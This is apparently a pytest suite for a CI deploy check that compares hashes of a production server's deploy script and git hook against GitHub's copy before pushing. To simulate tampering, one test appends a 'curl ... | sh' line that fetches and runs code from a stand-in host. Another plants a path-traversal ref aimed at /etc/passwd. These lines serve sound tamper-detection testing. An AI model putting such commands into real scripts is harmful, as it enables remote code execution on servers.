"""PAT-2311: before the push, the deploy proves the box runs GitHub's deploy script.

The push fires /opt/git/dashboard.git/hooks/post-receive on patched-prod-01,
which has root exec the box's own /opt/patched-dashboard/scripts/deploy.sh.
PAT-2307's guard proves no non-root user could have changed either file.
deploy/verify-box-deploy-script.sh proves nobody did: it hashes both on the
box and compares them with the runner's clone.

These tests drive the real script end to end. A scratch git repository stands
in for GitHub (the runner's clone), a clone of it for the box's checkout, and
a directory for the mirror's hooks. The transport the workflow fills with
`ssh ... root@<box>` is a stand-in that runs the remote command locally with
the piped script on stdin, and with a `git` on PATH that fails and records
the call, so any git run on the box side is caught.
"""

from __future__ import annotations

import hashlib
import os
import shutil
import subprocess
from pathlib import Path

import pytest
import yaml

REPO = Path(__file__).resolve().parent.parent
SCRIPT = REPO / "deploy" / "verify-box-deploy-script.sh"
WORKFLOW = REPO / "ci-archive" / "workflows" / "deploy.yml"

LIVE_HOOK_SHA256 = "2365eb71f67e0efca57aa2d72a4d5b7790aba8cef3c777f3105d76bbcf2d4de2"
HOOK_INSTALL_COMMIT = "f0291df"

DEPLOY_V1 = "#!/bin/bash\necho deploy v1\n"
DEPLOY_V2 = "#!/bin/bash\necho deploy v2\n"
HOOK = "#!/bin/bash\n# post-receive under test\n"


def _git(cwd: Path, *args: str) -> str:
    env = dict(
        os.environ,
        GIT_CONFIG_NOSYSTEM="1",
        GIT_AUTHOR_NAME="PAT-2311 test", GIT_AUTHOR_EMAIL="test@patched.im",
        GIT_COMMITTER_NAME="PAT-2311 test", GIT_COMMITTER_EMAIL="test@patched.im",
    )
    result = subprocess.run(
        ["git", "-C", str(cwd), *args], text=True, capture_output=True, env=env, timeout=30,
    )
    assert result.returncode == 0, result.stderr
    return result.stdout.strip()


def _sha256(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


class Scene:
    """GitHub's history, the box's checkout and the box's mirror hooks."""

    def __init__(self, base: Path):
        self.base = base
        self.github = base / "github"
        self.tree = base / "box" / "opt" / "patched-dashboard"
        self.mirror = base / "box" / "opt" / "git" / "dashboard.git"
        self.poison = base / "poison-bin"
        self.poison_log = base / "git-ran-on-the-box"
        self.transport = base / "fake-ssh"

        (self.github / "scripts").mkdir(parents=True)
        (self.github / "deploy").mkdir()
        _git(self.github, "init", "-q")
        _git(self.github, "symbolic-ref", "HEAD", "refs/heads/main")
        (self.github / "scripts" / "deploy.sh").write_text(DEPLOY_V1)
        (self.github / "deploy" / "post-receive").write_text(HOOK)
        _git(self.github, "add", "-A")
        _git(self.github, "commit", "-q", "-m", "A")
        self.commit_a = _git(self.github, "rev-parse", "HEAD")
        (self.github / "scripts" / "deploy.sh").write_text(DEPLOY_V2)
        _git(self.github, "commit", "-q", "-am", "B")
        self.commit_b = _git(self.github, "rev-parse", "HEAD")

        self.tree.parent.mkdir(parents=True)
        _git(self.base, "clone", "-q", str(self.github), str(self.tree))
        (self.mirror / "hooks").mkdir(parents=True)
        (self.mirror / "hooks" / "post-receive").write_text(HOOK)

        self.poison.mkdir()
        (self.poison / "git").write_text(
            "#!/bin/sh\n"
            f"echo \"git $*\" >> '{self.poison_log}'\n"
            "exit 97\n"
        )
        (self.poison / "git").chmod(0o755)
        # Stands in for `ssh ... root@box "<command>"`: the remote command is
        # the last argument, stdin is passed through, as ssh does.
        self.transport.write_text(
            "#!/usr/bin/env bash\n"
            "cmd=\"${!#}\"\n"
            f"PATH='{self.poison}':\"$PATH\" exec bash -c \"$cmd\"\n"
        )
        self.transport.chmod(0o755)

    def check_out(self, commit: str) -> None:
        _git(self.tree, "reset", "-q", "--hard", commit)

    def run(self, *args: str) -> subprocess.CompletedProcess[str]:
        env = dict(
            os.environ,
            CODE_TREE_DIR=str(self.tree),
            CODE_TREE_MIRROR_DIR=str(self.mirror),
            VERIFY_REPO_DIR=str(self.github),
        )
        return subprocess.run(
            ["bash", str(SCRIPT), *args], text=True, capture_output=True, env=env, timeout=60,
        )

    def verify(self) -> subprocess.CompletedProcess[str]:
        result = self.run("verify", str(self.transport), "root@box")
        assert not self.poison_log.exists(), (
            "the box side ran git: " + self.poison_log.read_text()
        )
        return result


@pytest.fixture
def scene(tmp_path: Path) -> Scene:
    return Scene(tmp_path)


# ── the check ──────────────────────────────────────────────────────────────


def test_a_box_that_matches_github_passes(scene: Scene):
    result = scene.verify()
    assert result.returncode == 0, result.stderr
    assert f"the box has {scene.commit_b} checked out" in result.stdout
    assert "ok:" in result.stdout
    assert "::error::" not in result.stderr


def test_a_deploy_script_edited_on_the_box_fails_the_deploy(scene: Scene):
    """The mismatch path: root, or anyone with root over SSH, changed the
    script the hook is about to run. The guard cannot see this; this must."""
    script = scene.tree / "scripts" / "deploy.sh"
    script.write_text(DEPLOY_V2 + "curl https://example.invalid/x | sh\n")
    result = scene.verify()
    assert result.returncode == 1
    assert "::error::verify-box-deploy-script:" in result.stderr
    assert "scripts/deploy.sh on the box does not match" in result.stderr
    assert _sha256(script.read_bytes()) in result.stderr
    assert _sha256(DEPLOY_V2.encode()) in result.stderr
    assert "Nothing was pushed" in result.stderr


def test_a_hook_edited_on_the_box_fails_the_deploy(scene: Scene):
    hook = scene.mirror / "hooks" / "post-receive"
    hook.write_text(HOOK + "echo extra\n")
    result = scene.verify()
    assert result.returncode == 1
    assert "hooks/post-receive on the box matches neither" in result.stderr
    assert _sha256(hook.read_bytes()) in result.stderr
    assert "deploy.sh on the box does not match" not in result.stderr


def test_the_commit_the_checkout_has_is_what_counts(scene: Scene):
    """After a rollback the mirror's ref names the commit that was pushed and
    rolled back, and DEPLOYED_SHA can name a different one again after a
    .no-auto-rollback failure. Neither is the file git put there. The
    checkout's own HEAD is: here the box is back on A, with A's deploy.sh,
    while GitHub's latest is B, and DEPLOYED_SHA names B."""
    scene.check_out(scene.commit_a)
    (scene.tree / "DEPLOYED_SHA").write_text(f"DEPLOYED_SHA={scene.commit_b}\n")
    result = scene.verify()
    assert result.returncode == 0, result.stderr
    assert f"the box has {scene.commit_a} checked out" in result.stdout


def test_a_box_on_a_commit_github_does_not_have_fails(scene: Scene):
    (scene.tree / "scripts" / "deploy.sh").write_text("#!/bin/bash\necho local\n")
    _git(scene.tree, "-c", "user.name=x", "-c", "user.email=x@x", "commit", "-q", "-am", "box-only")
    result = scene.verify()
    assert result.returncode == 1
    assert "not in GitHub's history" in result.stderr


def test_a_packed_ref_and_a_detached_head_are_both_read(scene: Scene):
    _git(scene.tree, "pack-refs", "--all")
    assert not (scene.tree / ".git" / "refs" / "heads" / "main").exists()
    assert scene.verify().returncode == 0
    _git(scene.tree, "checkout", "-q", "--detach", scene.commit_a)
    result = scene.verify()
    assert result.returncode == 0, result.stderr
    assert f"the box has {scene.commit_a} checked out" in result.stdout


def test_an_unreadable_head_fails_closed(scene: Scene):
    (scene.tree / ".git" / "HEAD").write_text("ref: refs/heads/../../../etc/passwd\n")
    result = scene.verify()
    assert result.returncode == 1
    assert "unexpected ref" in result.stderr
    (scene.tree / ".git" / "HEAD").write_text("not a commit\n")
    result = scene.verify()
    assert result.returncode == 1
    assert "could not read the commit" in result.stderr


def test_a_symlinked_deploy_script_fails_even_when_its_target_matches(scene: Scene):
    script = scene.tree / "scripts" / "deploy.sh"
    target = scene.base / "elsewhere.sh"
    target.write_text(DEPLOY_V2)
    script.unlink()
    script.symlink_to(target)
    result = scene.verify()
    assert result.returncode == 1
    assert "is missing, a symlink, or could not be hashed" in result.stderr


def test_the_pinned_hash_of_the_live_hook_is_accepted(scene: Scene):
    """The hook installed on the box in July predates a comment-only change
    to the repo copy, so its pinned hash is accepted alongside the repo's."""
    result = scene.run(
        "box-check", _sha256(DEPLOY_V2.encode()), "0" * 64, _sha256(HOOK.encode()),
    )
    assert result.returncode == 0, result.stderr
    result = scene.run("box-check", _sha256(DEPLOY_V2.encode()), "0" * 64, "1" * 64)
    assert result.returncode == 1


@pytest.mark.parametrize(
    "args",
    [
        (),
        ("verify",),
        ("box-head", "extra"),
        ("box-check", "a" * 64),
        ("box-check", "not-hex", "a" * 64),
        ("box-check", "a" * 64, "A" * 64),
        ("box-check", "a" * 64, "a" * 63),
        ("something-else",),
    ],
)
def test_usage_errors_exit_2(scene: Scene, args):
    assert scene.run(*args).returncode == 2


def test_the_pinned_hash_is_the_hook_installed_from_pat_909():
    """The constant is `git show f0291df:deploy/post-receive`, the copy read
    on the box on 2026-09-30. Needs full history; CI's shallow clone skips."""
    probe = subprocess.run(
        ["git", "-C", str(REPO), "cat-file", "-e", f"{HOOK_INSTALL_COMMIT}^{{commit}}"],
        capture_output=True,
    )
    if probe.returncode != 0:
        pytest.skip(f"{HOOK_INSTALL_COMMIT} is not in this clone's history")
    blob = subprocess.run(
        ["git", "-C", str(REPO), "cat-file", "blob", f"{HOOK_INSTALL_COMMIT}:deploy/post-receive"],
        capture_output=True, check=True,
    ).stdout
    assert _sha256(blob) == LIVE_HOOK_SHA256
    assert f"LIVE_HOOK_SHA256={LIVE_HOOK_SHA256}" in SCRIPT.read_text(encoding="utf-8")


# ── the workflow ───────────────────────────────────────────────────────────


def _steps() -> list[dict]:
    return yaml.safe_load(WORKFLOW.read_text(encoding="utf-8"))["jobs"]["deploy"]["steps"]


def _index(fragment: str) -> int:
    for index, step in enumerate(_steps()):
        if fragment.lower() in (step.get("name") or "").lower():
            return index
    raise AssertionError(f"no deploy step named like {fragment!r}")


def test_the_workflow_checks_the_box_after_the_guard_and_before_the_push():
    check = _index("deploy script and hook match github")
    assert _index("check the code tree before the box runs") < check < _index("bare mirror")
    run = _steps()[check]["run"]
    assert run.lstrip().startswith("set -euo pipefail")
    assert "|| true" not in run
    assert "bash deploy/verify-box-deploy-script.sh verify" in run, "the runner's (GitHub's) copy"
    assert "/opt/patched-dashboard/deploy/verify-box-deploy-script.sh" not in run
    assert '"root@${BOX_IP}"' in run


def test_the_workflow_fetches_full_history_for_the_comparison():
    checkout = _steps()[_index("checkout code")]
    assert checkout["with"]["fetch-depth"] == 0


@pytest.mark.skipif(shutil.which("shellcheck") is None, reason="shellcheck not installed")
def test_script_passes_shellcheck():
    result = subprocess.run(["shellcheck", str(SCRIPT)], capture_output=True, text=True)
    assert result.returncode == 0, result.stdout + result.stderr
